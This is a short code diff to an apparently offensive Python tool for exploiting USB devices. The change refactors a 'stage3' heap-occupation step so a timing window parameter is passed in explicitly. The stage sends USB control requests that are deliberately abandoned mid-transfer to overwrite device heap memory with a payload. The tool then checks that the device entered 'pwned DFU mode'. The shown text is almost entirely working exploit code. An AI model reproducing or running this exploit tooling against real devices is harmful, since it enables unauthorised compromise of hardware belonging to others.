@@ -694,7 +694,7 @@ def stage2(usb, out_spin_us, padding, debug):
     reset_and_release(usb, handle, settle=0.5)
 
 
-def stage3(usb, serial_idx, payload, overwrite, spin_us, debug):
+def stage3(usb, serial_idx, payload, overwrite, spin_us, debug, crit_us=None):
     print('== stage 3: heap occupation (overwrite + payload) ==')
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     # (h) one abandoned IN request ("no leak"), same shape as the Arduino's
@@ -708,7 +708,7 @@ def stage3(usb, serial_idx, payload, overwrite, spin_us, debug):
     # 3 full-speed packets.  The sketch's occupation needs the SETUP PROCESSED by
     # the device (response-buffer alloc) with the transfer then abandoned mid-data
     # so no status ZLP ever runs.  Wide window per the trace: 150us..750us.
-    crit_us = getattr(args, 'crit_us', None) or 450
+    crit_us = crit_us or 450
     rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
                             (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
                             0x81, b'', abandon=True, cancel_at=0,
@@ -830,7 +830,8 @@ def exploit(args):
     if args.stage in ('all', '2'):
         stage2(usb, args.out_spin_us, args.padding, args.debug)
     if args.stage in ('all', '3'):
-        stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug)
+        stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug,
+               crit_us=getattr(args, 'crit_us', None))
     serial = verify(usb)
     if PWN_MARKER not in serial:
         raise SystemExit('error: exploit failed — device did not enter pwned DFU mode.\n'
